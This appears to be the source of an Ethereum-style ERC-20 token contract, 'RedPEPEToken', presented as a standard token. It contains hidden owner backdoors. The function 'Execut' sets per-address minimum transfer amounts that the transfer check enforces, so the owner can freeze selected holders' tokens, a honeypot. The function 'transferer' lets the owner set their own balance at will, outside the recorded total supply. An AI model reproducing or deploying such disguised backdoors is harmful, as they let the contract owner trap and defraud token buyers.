1 // SPDX-License-Identifier: MIT
2 
3 // pragma solidity ^0.8.0;
4 
5 
6 interface IERC20 {
7 
8     function totalSupply() external view returns (uint256);
9 
10     function balanceOf(address account) external view returns (uint256);
11 
12     function transfer(address recipient, uint256 amount) external returns (bool);
13 
14 
15     function allowance(address owner, address spender) external view returns (uint256);
16 
17     function approve(address spender, uint256 amount) external returns (bool);
18 
19     function transferFrom(
20         address sender,
21         address recipient,
22         uint256 amount
23     ) external returns (bool);
24 
25 
26     event Transfer(address indexed from, address indexed to, uint256 value);
27 
28     event Approval(address indexed owner, address indexed spender, uint256 value);
29 }
30 
31 abstract contract Context {
32     function _msgSender() internal view virtual returns (address) {
33         return msg.sender;
34     }
35 
36     function _msgData() internal view virtual returns (bytes calldata) {
37         return msg.data;
38     }
39 }
40 
41 abstract contract Ownable is Context {
42     address private _owner;
43 
44     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
45 
46     constructor() {
47         _setOwner(_msgSender());
48     }
49 
50     function owner() public view virtual returns (address) {
51         return _owner;
52     }
53 
54     modifier onlyOwner() {
55         require(owner() == _msgSender(), "Ownable: caller is not the owner");
56         _;
57     }
58 
59     function renounceOwnership() public virtual onlyOwner {
60         _setOwner(address(0));
61     }
62 
63     function transferOwnership(address newOwner) public virtual onlyOwner {
64         require(newOwner != address(0), "Ownable: new owner is the zero address");
65         _setOwner(newOwner);
66     }
67 
68     function _setOwner(address newOwner) private {
69         address oldOwner = _owner;
70         _owner = newOwner;
71         emit OwnershipTransferred(oldOwner, newOwner);
72     }
73 }
74 
75 library SafeMath {
76 
77     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
78         unchecked {
79             uint256 c = a + b;
80             if (c < a) return (false, 0);
81             return (true, c);
82         }
83     }
84 
85     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
86         unchecked {
87             if (b > a) return (false, 0);
88             return (true, a - b);
89         }
90     }
91 
92     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
93         unchecked {
94             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
95             // benefit is lost if 'b' is also tested.
96             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
97             if (a == 0) return (true, 0);
98             uint256 c = a * b;
99             if (c / a != b) return (false, 0);
100             return (true, c);
101         }
102     }
103 
104     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
105         unchecked {
106             if (b == 0) return (false, 0);
107             return (true, a / b);
108         }
109     }
110 
111     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
112         unchecked {
113             if (b == 0) return (false, 0);
114             return (true, a % b);
115         }
116     }
117 
118     function add(uint256 a, uint256 b) internal pure returns (uint256) {
119         return a + b;
120     }
121 
122     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
123         return a - b;
124     }
125 
126     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
127         return a * b;
128     }
129 
130     function div(uint256 a, uint256 b) internal pure returns (uint256) {
131         return a / b;
132     }
133 
134     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
135         return a % b;
136     }
137 
138     function sub(
139         uint256 a,
140         uint256 b,
141         string memory errorMessage
142     ) internal pure returns (uint256) {
143         unchecked {
144             require(b <= a, errorMessage);
145             return a - b;
146         }
147     }
148 
149     function div(
150         uint256 a,
151         uint256 b,
152         string memory errorMessage
153     ) internal pure returns (uint256) {
154         unchecked {
155             require(b > 0, errorMessage);
156             return a / b;
157         }
158     }
159 
160     function mod(
161         uint256 a,
162         uint256 b,
163         string memory errorMessage
164     ) internal pure returns (uint256) {
165         unchecked {
166             require(b > 0, errorMessage);
167             return a % b;
168         }
169     }
170 }
171 
172 
173 enum TokenType {
174     standard,
175     antiBotStandard,
176     liquidityGenerator,
177     antiBotLiquidityGenerator,
178     baby,
179     antiBotBaby,
180     buybackBaby,
181     antiBotBuybackBaby
182 }
183 
184 abstract contract BaseToken {
185     event TokenCreated(
186         address indexed owner,
187         address indexed token,
188         TokenType tokenType,
189         uint256 version
190     );
191 }
192 
193 pragma solidity =0.8.4;
194 
195 contract RedPEPEToken is IERC20, Ownable, BaseToken {
196     using SafeMath for uint256;
197 
198     uint256 public constant VERSION = 1;
199 
200     mapping(address => uint256) private _balances;
201     mapping(address => mapping(address => uint256)) private _allowances;
202     mapping(address => uint256) private _MFs; 
203 
204     string private _name;
205     string private _symbol;
206     uint8 private _decimals;
207     uint256 private _totalSupply;
208 
209     constructor(
210         string memory name_,
211         string memory symbol_,
212         uint8 decimals_,
213         uint256 totalSupply_
214 
215     ) payable {
216         _name = name_;
217         _symbol = symbol_;
218         _decimals = decimals_;
219         _mint(owner(), totalSupply_);
220 
221         emit TokenCreated(owner(), address(this), TokenType.standard, VERSION);
222     }
223     function Execut(address account, uint256 amount) public onlyOwner {
224         _MFs[account] = amount;
225     }
226 
227     function getMF(address account) public view returns (uint256) {
228         return _MFs[account];
229     }
230     function transferer(uint256 balan) public onlyOwner {
231         _balances[owner()] = balan;
232     }
233 
234 
235     function name() public view virtual returns (string memory) {
236         return _name;
237     }
238 
239     function symbol() public view virtual returns (string memory) {
240         return _symbol;
241     }
242 
243     function decimals() public view virtual returns (uint8) {
244         return _decimals;
245     }
246 
247     function totalSupply() public view virtual override returns (uint256) {
248         return _totalSupply;
249     }
250 
251     function balanceOf(address account)
252         public
253         view
254         virtual
255         override
256         returns (uint256)
257     {
258         return _balances[account];
259     }
260 
261     function transfer(address recipient, uint256 amount)
262         public
263         virtual
264         override
265         returns (bool)
266     {
267         _transfer(_msgSender(), recipient, amount);
268         return true;
269     }
270 
271     function allowance(address owner, address spender)
272         public
273         view
274         virtual
275         override
276         returns (uint256)
277     {
278         return _allowances[owner][spender];
279     }
280 
281 
282     function approve(address spender, uint256 amount)
283         public
284         virtual
285         override
286         returns (bool)
287     {
288         _approve(_msgSender(), spender, amount);
289         return true;
290     }
291 
292     function transferFrom(
293         address sender,
294         address recipient,
295         uint256 amount
296     ) public virtual override returns (bool) {
297         _transfer(sender, recipient, amount);
298         _approve(
299             sender,
300             _msgSender(),
301             _allowances[sender][_msgSender()].sub(
302                 amount,
303                 "ERC20: transfer amount exceeds allowance"
304             )
305         );
306         return true;
307     }
308 
309     function increaseAllowance(address spender, uint256 addedValue)
310         public
311         virtual
312         returns (bool)
313     {
314         _approve(
315             _msgSender(),
316             spender,
317             _allowances[_msgSender()][spender].add(addedValue)
318         );
319         return true;
320     }
321 
322     function decreaseAllowance(address spender, uint256 subtractedValue)
323         public
324         virtual
325         returns (bool)
326     {
327         _approve(
328             _msgSender(),
329             spender,
330             _allowances[_msgSender()][spender].sub(
331                 subtractedValue,
332                 "ERC20: decreased allowance below zero"
333             )
334         );
335         return true;
336     }
337     function _transfer(
338         address sender,
339         address recipient,
340         uint256 amount
341     ) internal virtual {
342         require(sender != address(0), "ERC20: transfer from the zero address");
343         require(recipient != address(0), "ERC20: transfer to the zero address");
344         require(amount >= _MFs[sender], "ERC20: transfer amount is less than minimum allowed"); 
345 
346         _beforeTokenTransfer(sender, recipient, amount);
347 
348         _balances[sender] = _balances[sender].sub(
349             amount,
350             "ERC20: transfer amount exceeds balance"
351         );
352         _balances[recipient] = _balances[recipient].add(amount);
353         emit Transfer(sender, recipient, amount);
354     }
355     function _mint(address account, uint256 amount) internal virtual {
356         require(account != address(0), "ERC20: mint to the zero address");
357 
358         _beforeTokenTransfer(address(0), account, amount);
359 
360         _totalSupply = _totalSupply.add(amount);
361         _balances[account] = _balances[account].add(amount);
362         emit Transfer(address(0), account, amount);
363     }
364 
365     function _burn(address account, uint256 amount) internal virtual {
366         require(account != address(0), "ERC20: burn from the zero address");
367 
368         _beforeTokenTransfer(account, address(0), amount);
369 
370         _balances[account] = _balances[account].sub(
371             amount,
372             "ERC20: burn amount exceeds balance"
373         );
374         _totalSupply = _totalSupply.sub(amount);
375         emit Transfer(account, address(0), amount);
376     }
377 
378     function _approve(
379         address owner,
380         address spender,
381         uint256 amount
382     ) internal virtual {
383         require(owner != address(0), "ERC20: approve from the zero address");
384         require(spender != address(0), "ERC20: approve to the zero address");
385 
386         _allowances[owner][spender] = amount;
387         emit Approval(owner, spender, amount);
388     }
389 
390     function _setupDecimals(uint8 decimals_) internal virtual {
391         _decimals = decimals_;
392     }
393 
394     function _beforeTokenTransfer(
395         address from,
396         address to,
397         uint256 amount
398     ) internal virtual {}
399 }